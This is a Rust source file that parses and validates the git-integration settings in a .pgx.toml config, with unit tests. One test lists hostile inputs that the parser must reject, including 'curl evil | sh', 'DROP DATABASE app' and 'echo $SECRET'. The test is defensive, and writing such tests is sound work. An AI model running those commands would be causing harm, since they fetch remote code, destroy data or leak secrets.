//! The `[git]` tables of `.pgx.toml`: safe, committed project settings for
//! PGX Git. Mutable lifecycle state (database names, generations, OIDs) never
//! lives here; it is kept under `$PGX_HOME/git/` (see `state.rs`).
//!
//! The same deliberately tiny TOML subset as the `[agent]` table
//! (`cmd/agent/project.rs`): `[section]` headers, `key = "string"`,
//! `key = true|false`, `key = ["a", "b"]` on one line, `#` comments. Unknown
//! keys are ignored so newer files load in older binaries; every value that is
//! read is validated, so a hostile or mistaken file cannot smuggle a URL, a
//! shell fragment or an invalid name into a command.
use crate::errors::{PgxError, Result};

pub const FILE: &str = ".pgx.toml";
pub const DEFAULT_MAIN: &str = "main";
pub const DEFAULT_ABANDONED_TTL: &str = "7d";

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SyncMode {
    /// A new main snapshot when the schema or the migration bookkeeping changes.
    Schema,
    /// Also when row counts change (seed data matters to the project).
    Data,
}

impl SyncMode {
    pub fn as_str(self) -> &'static str {
        match self {
            SyncMode::Schema => "schema",
            SyncMode::Data => "data",
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct GitConfig {
    /// A `[git]` table exists.
    pub present: bool,
    pub enabled: bool,
    pub main_branch: Option<String>,
    /// The PGX database the main development database was first cloned from.
    pub source: Option<String>,
    pub auto_branch: bool,
    pub auto_sync: bool,
    pub sync_mode: SyncMode,
    pub abandoned_ttl: String,
    pub protected_branches: Vec<String>,
    pub agents_enabled: bool,
    pub auto_apply_main: bool,
    /// The project's migration command (`bin/rails db:migrate`). Run only on
    /// explicit request (`pgx git sync --migrate`) or, with `auto_apply_main`,
    /// after the developer approved this exact text once.
    pub migrate_command: Option<String>,
}

impl Default for GitConfig {
    fn default() -> Self {
        GitConfig {
            present: false,
            enabled: false,
            main_branch: None,
            source: None,
            auto_branch: true,
            auto_sync: true,
            sync_mode: SyncMode::Schema,
            abandoned_ttl: DEFAULT_ABANDONED_TTL.to_string(),
            protected_branches: vec!["main".to_string(), "master".to_string()],
            agents_enabled: true,
            auto_apply_main: false,
            migrate_command: None,
        }
    }
}

impl GitConfig {
    pub fn is_on(&self) -> bool {
        self.present && self.enabled
    }
    pub fn main(&self) -> &str {
        self.main_branch.as_deref().unwrap_or(DEFAULT_MAIN)
    }
    pub fn is_protected(&self, branch: &str) -> bool {
        branch == self.main() || self.protected_branches.iter().any(|b| b == branch)
    }
    pub fn abandoned_secs(&self) -> u64 {
        crate::ttl::parse_ttl(&self.abandoned_ttl)
            .ok()
            .and_then(|t| t.as_seconds())
            .unwrap_or(7 * 86_400)
    }
}

/// A branch name as Git accepts it for `refs/heads/<name>`, checked without
/// running Git (the hook path must not depend on it): no control characters,
/// spaces, `~^:?*[\`, no `..`, `@{`, leading `-`, `/` at either end, `//`,
/// a component starting with `.` or ending in `.lock`, at most 255 bytes.
pub fn valid_branch(name: &str) -> bool {
    if name.is_empty() || name.len() > 255 || name == "@" {
        return false;
    }
    if name.starts_with('-') || name.starts_with('/') || name.ends_with('/') {
        return false;
    }
    if name.ends_with('.') || name.contains("..") || name.contains("@{") || name.contains("//") {
        return false;
    }
    if name
        .bytes()
        .any(|b| b < 0x20 || b == 0x7f || b" ~^:?*[\\".contains(&b))
    {
        return false;
    }
    name.split('/')
        .all(|c| !c.is_empty() && !c.starts_with('.') && !c.ends_with(".lock"))
}

fn strip_comment(line: &str) -> &str {
    let mut quote: Option<char> = None;
    for (i, c) in line.char_indices() {
        match (quote, c) {
            (None, '#') => return &line[..i],
            (None, '"') | (None, '\'') => quote = Some(c),
            (Some(q), c) if c == q => quote = None,
            _ => {}
        }
    }
    line
}

fn unquote(v: &str) -> Option<String> {
    let inner = v
        .strip_prefix('"')
        .and_then(|s| s.strip_suffix('"'))
        .or_else(|| v.strip_prefix('\'').and_then(|s| s.strip_suffix('\'')))?;
    Some(inner.to_string())
}

fn parse_bool(k: &str, v: &str) -> Result<bool> {
    match v {
        "true" => Ok(true),
        "false" => Ok(false),
        other => Err(PgxError::usage(format!(
            "{FILE}: {k} must be true or false, got {other}"
        ))),
    }
}

fn parse_array(k: &str, v: &str) -> Result<Vec<String>> {
    let inner = v
        .strip_prefix('[')
        .and_then(|s| s.strip_suffix(']'))
        .ok_or_else(|| PgxError::usage(format!("{FILE}: {k} must be an array like [\"main\"]")))?;
    let mut items = Vec::new();
    for part in inner.split(',') {
        let p = part.trim();
        if p.is_empty() {
            continue;
        }
        let s = unquote(p).ok_or_else(|| {
            PgxError::usage(format!("{FILE}: {k}: every item must be a quoted string"))
        })?;
        items.push(s);
    }
    Ok(items)
}

fn string(k: &str, v: &str) -> Result<String> {
    let s = unquote(v)
        .ok_or_else(|| PgxError::usage(format!("{FILE}: {k} must be a quoted string")))?;
    if s.contains("://") {
        return Err(PgxError::usage(format!(
            "{FILE}: {k} must not be a connection URL (connection URLs and credentials do not belong in {FILE})"
        )));
    }
    Ok(s)
}

pub fn parse(text: &str) -> Result<GitConfig> {
    let mut cfg = GitConfig::default();
    let mut enabled: Option<bool> = None;
    let mut section = String::new();
    for raw in text.lines() {
        let line = strip_comment(raw).trim();
        if line.is_empty() {
            continue;
        }
        if let Some(s) = line.strip_prefix('[').and_then(|l| l.strip_suffix(']')) {
            section = s.trim().to_string();
            if section == "git" || section.starts_with("git.") {
                cfg.present = true;
            }
            continue;
        }
        let Some((k, v)) = line.split_once('=') else {
            continue;
        };
        let (k, v) = (k.trim(), v.trim());
        match (section.as_str(), k) {
            ("git", "enabled") => enabled = Some(parse_bool(k, v)?),
            ("git", "main_branch") => {
                let b = string(k, v)?;
                if !valid_branch(&b) {
                    return Err(PgxError::usage(format!(
                        "{FILE}: main_branch {b:?} is not a valid Git branch name"
                    )));
                }
                cfg.main_branch = Some(b);
            }
            ("git", "source") => {
                let s = string(k, v)?;
                crate::names::validate(&s)
                    .map_err(|e| PgxError::usage(format!("{FILE}: [git] source: {}", e.message)))?;
                cfg.source = Some(s);
            }
            ("git", "auto_branch") => cfg.auto_branch = parse_bool(k, v)?,
            ("git", "auto_sync") => cfg.auto_sync = parse_bool(k, v)?,
            ("git", "sync_mode") => {
                cfg.sync_mode = match string(k, v)?.as_str() {
                    "schema" => SyncMode::Schema,
                    "data" => SyncMode::Data,
                    other => {
                        return Err(PgxError::usage(format!(
                            "{FILE}: sync_mode must be \"schema\" or \"data\", got {other:?}"
                        )))
                    }
                }
            }
            ("git", "branch_source") => {
                let s = string(k, v)?;
                if s != "main" {
                    return Err(PgxError::usage(format!(
                        "{FILE}: branch_source must be \"main\" (new branches start from the latest validated main snapshot), got {s:?}"
                    )));
                }
            }
            ("git", "preserve_existing") => {
                if !parse_bool(k, v)? {
                    return Err(PgxError::usage(format!(
                        "{FILE}: preserve_existing = false is not supported: PGX Git never replaces an existing branch database automatically (use `pgx git reset --from-main`)"
                    )));
                }
            }
            ("git.cleanup", "abandoned_ttl") => {
                let s = string(k, v)?;
                match crate::ttl::parse_ttl(&s)? {
                    crate::ttl::Ttl::Seconds(_) => cfg.abandoned_ttl = s,
                    crate::ttl::Ttl::Unlimited => cfg.abandoned_ttl = "3650d".to_string(),
                }
            }
            ("git.cleanup", "protected_branches") => {
                let list = parse_array(k, v)?;
                for b in &list {
                    if !valid_branch(b) {
                        return Err(PgxError::usage(format!(
                            "{FILE}: protected_branches: {b:?} is not a valid Git branch name"
                        )));
                    }
                }
                cfg.protected_branches = list;
            }
            ("git.agents", "enabled") => cfg.agents_enabled = parse_bool(k, v)?,
            ("git.agents", "isolated_per_session") | ("git.agents", "isolated_per_subagent") => {
                if !parse_bool(k, v)? {
                    return Err(PgxError::usage(format!(
                        "{FILE}: [git.agents] {k} = false is not supported: agent sessions and subagents never share a mutable database"
                    )));
                }
            }
            ("git.migrations", "auto_apply_main") => cfg.auto_apply_main = parse_bool(k, v)?,
            ("git.migrations", "command") => {
                let c = string(k, v)?;
                if c.trim().is_empty() || c.contains('\n') || c.contains('\0') {
                    return Err(PgxError::usage(format!(
                        "{FILE}: [git.migrations] command must be a single non-empty line"
                    )));
                }
                // Parsed now so a malformed command fails at load time.
                split_words(&c)?;
                cfg.migrate_command = Some(c);
            }
            _ => {}
        }
    }
    cfg.enabled = enabled.unwrap_or(cfg.present);
    Ok(cfg)
}

/// Split a configured command into argv the way a shell would split plain
/// words and quotes, but without a shell: no variables, globbing,
/// substitution, pipes or redirection. Anything that needs a shell is
/// refused, so the text runs exactly as the words it shows.
pub fn split_words(s: &str) -> Result<Vec<String>> {
    let mut words = Vec::new();
    let mut cur = String::new();
    let mut in_word = false;
    let mut chars = s.chars();
    let refuse = |c: char| {
        PgxError::usage(format!(
            "{FILE}: [git.migrations] command must be plain words (found {c:?}); wrap shell logic in a script such as bin/migrate"
        ))
    };
    while let Some(c) = chars.next() {
        match c {
            ' ' | '\t' => {
                if in_word {
                    words.push(std::mem::take(&mut cur));
                    in_word = false;
                }
            }
            '\'' => {
                in_word = true;
                loop {
                    match chars.next() {
                        Some('\'') => break,
                        Some(x) => cur.push(x),
                        None => {
                            return Err(PgxError::usage(format!(
                                "{FILE}: unterminated quote in command"
                            )))
                        }
                    }
                }
            }
            '"' => {
                in_word = true;
                loop {
                    match chars.next() {
                        Some('"') => break,
                        Some('$') | Some('`') => return Err(refuse('$')),
                        Some(x) => cur.push(x),
                        None => {
                            return Err(PgxError::usage(format!(
                                "{FILE}: unterminated quote in command"
                            )))
                        }
                    }
                }
            }
            '$' | '`' | '|' | ';' | '&' | '<' | '>' | '(' | ')' | '*' | '?' | '\\' | '~' => {
                return Err(refuse(c))
            }
            x => {
                in_word = true;
                cur.push(x);
            }
        }
    }
    if in_word {
        words.push(cur);
    }
    if words.is_empty() {
        return Err(PgxError::usage(format!(
            "{FILE}: [git.migrations] command is empty"
        )));
    }
    Ok(words)
}

/// Render a TOML string literal (basic string, escaped).
pub fn lit(s: &str) -> String {
    let mut o = String::from("\"");
    for c in s.chars() {
        match c {
            '"' => o.push_str("\\\""),
            '\\' => o.push_str("\\\\"),
            c => o.push(c),
        }
    }
    o.push('"');
    o
}

/// The `[git]` block `pgx git init` appends to a `.pgx.toml` that has none.
pub fn render_block(main: &str, source: Option<&str>) -> String {
    let mut s = String::from(
        "\n# PGX Git: one Git branch, one isolated Postgres database (safe to commit).\n\
         # Written by `pgx git init`; see docs/pgx/local-dev/git.md.\n[git]\nenabled = true\n",
    );
    s.push_str(&format!("main_branch = {}\n", lit(main)));
    if let Some(src) = source {
        s.push_str(&format!("source = {}\n", lit(src)));
    }
    s.push_str(
        "auto_branch = true          # a new Git branch gets its own database on checkout\n\
         auto_sync = true            # refresh the main snapshot when main's schema changes\n\
         sync_mode = \"schema\"\n\
         branch_source = \"main\"\n\
         preserve_existing = true    # main updates never replace an existing branch database\n\
         \n[git.cleanup]\nabandoned_ttl = \"7d\"\n",
    );
    s.push_str(&format!("protected_branches = [{}]\n", {
        let mut v = vec![lit(main)];
        for b in ["main", "master"] {
            if b != main {
                v.push(lit(b));
            }
        }
        v.join(", ")
    }));
    s.push_str(
        "\n[git.agents]\nenabled = true              # agent sessions branch from the current Git branch's database\n\
         \n[git.migrations]\nauto_apply_main = false     # never run migrations unless you opt in\n\
         # command = \"bin/rails db:migrate\"\n",
    );
    s
}

/// Set `key = value` inside `[section]` of an existing file, preserving every
/// other line. Adds the key after the header, or the section at the end.
pub fn set_key(text: &str, section: &str, key: &str, value: &str) -> String {
    let mut lines: Vec<String> = text.lines().map(String::from).collect();
    let mut in_section = false;
    let mut header_at: Option<usize> = None;
    let mut end_at: Option<usize> = None;
    for (i, raw) in lines.iter().enumerate() {
        let l = strip_comment(raw).trim().to_string();
        if let Some(s) = l.strip_prefix('[').and_then(|x| x.strip_suffix(']')) {
            if in_section && end_at.is_none() {
                end_at = Some(i);
            }
            in_section = s.trim() == section;
            if in_section {
                header_at = Some(i);
                end_at = None;
            }
            continue;
        }
        if in_section {
            if let Some((k, _)) = l.split_once('=') {
                if k.trim() == key {
                    lines[i] = format!("{key} = {value}");
                    let mut out = lines.join("\n");
                    out.push('\n');
                    return out;
                }
            }
        }
    }
    let _ = end_at;
    match header_at {
        Some(h) => lines.insert(h + 1, format!("{key} = {value}")),
        None => {
            lines.push(String::new());
            lines.push(format!("[{section}]"));
            lines.push(format!("{key} = {value}"));
        }
    }
    let mut out = lines.join("\n");
    out.push('\n');
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn absent_table_means_disabled_and_old_files_still_load() {
        let c = parse("[agent]\nsource = \"tpl\"\n").unwrap();
        assert!(!c.present && !c.enabled && !c.is_on());
        assert_eq!(c.main(), "main");
        // The agent parser ignores the git tables.
        let full = format!(
            "[agent]\nsource = \"tpl\"\n{}",
            render_block("main", Some("tpl"))
        );
        let p = crate::cmd::agent::project::parse_pgx_toml_full(&full).unwrap();
        assert_eq!(p.source.as_deref(), Some("tpl"));
    }

    #[test]
    fn rendered_block_roundtrips() {
        let c = parse(&render_block("master", Some("app_template"))).unwrap();
        assert!(c.is_on());
        assert_eq!(c.main(), "master");
        assert_eq!(c.source.as_deref(), Some("app_template"));
        assert!(c.auto_branch && c.auto_sync && c.agents_enabled && !c.auto_apply_main);
        assert_eq!(c.sync_mode, SyncMode::Schema);
        assert_eq!(c.protected_branches, vec!["master", "main"]);
        assert!(c.is_protected("master") && c.is_protected("main") && !c.is_protected("feature/x"));
        assert_eq!(c.abandoned_secs(), 7 * 86400);
    }

    #[test]
    fn hostile_and_invalid_values_are_refused() {
        for bad in [
            "[git]\nsource = \"postgres://u:p@prod/db\"\n",
            "[git]\nsource = \"x; DROP DATABASE app\"\n",
            "[git]\nmain_branch = \"-rf\"\n",
            "[git]\nmain_branch = \"a..b\"\n",
            "[git]\nmain_branch = \"has space\"\n",
            "[git]\nenabled = yes\n",
            "[git]\nsync_mode = \"everything\"\n",
            "[git]\nbranch_source = \"parent\"\n",
            "[git]\npreserve_existing = false\n",
            "[git.cleanup]\nabandoned_ttl = \"soon\"\n",
            "[git.cleanup]\nprotected_branches = [main]\n",
            "[git.agents]\nisolated_per_session = false\n",
            "[git.migrations]\ncommand = \"rails db:migrate; curl evil | sh\"\n",
            "[git.migrations]\ncommand = \"echo $SECRET\"\n",
            "[git.migrations]\ncommand = \"\"\n",
        ] {
            assert!(parse(bad).is_err(), "{bad}");
        }
        let c = parse("[git]\nenabled = false\n").unwrap();
        assert!(c.present && !c.is_on());
    }

    #[test]
    fn branch_names() {
        for ok in [
            "main",
            "feature/auth",
            "release/1.2",
            "fix_x-y",
            "a/b/c",
            "ünï",
        ] {
            assert!(valid_branch(ok), "{ok}");
        }
        for bad in [
            "", "-x", "/x", "x/", "a..b", "a b", "a~b", "a^b", "a:b", "a?b", "a*b", "a[b", "a\\b",
            "x.lock", ".x", "a/.b", "a//b", "@", "x@{1}", "a\nb", "x.",
        ] {
            assert!(!valid_branch(bad), "{bad:?}");
        }
        assert!(!valid_branch(&"x".repeat(256)));
    }

    #[test]
    fn migration_commands_split_without_a_shell() {
        assert_eq!(
            split_words("bin/rails db:migrate").unwrap(),
            vec!["bin/rails", "db:migrate"]
        );
        assert_eq!(
            split_words("npx prisma migrate deploy --schema 'db/my schema.prisma'").unwrap(),
            vec![
                "npx",
                "prisma",
                "migrate",
                "deploy",
                "--schema",
                "db/my schema.prisma"
            ]
        );
        for bad in [
            "a | b",
            "a && b",
            "a > f",
            "$(x)",
            "`x`",
            "a;b",
            "\"$HOME\"",
            "'open",
        ] {
            assert!(split_words(bad).is_err(), "{bad}");
        }
    }

    #[test]
    fn set_key_preserves_other_content() {
        let text = "# mine\n[agent]\nsource = \"tpl\"\n\n[git]\nenabled = true\nmain_branch = \"main\" # c\n";
        let t = set_key(text, "git", "main_branch", &lit("trunk"));
        assert!(t.contains("# mine\n[agent]\nsource = \"tpl\""));
        assert_eq!(parse(&t).unwrap().main(), "trunk");
        let t2 = set_key(&t, "git", "source", &lit("app_tpl"));
        assert_eq!(parse(&t2).unwrap().source.as_deref(), Some("app_tpl"));
        let t3 = set_key("[agent]\n", "git", "enabled", "true");
        assert!(parse(&t3).unwrap().is_on());
    }
}
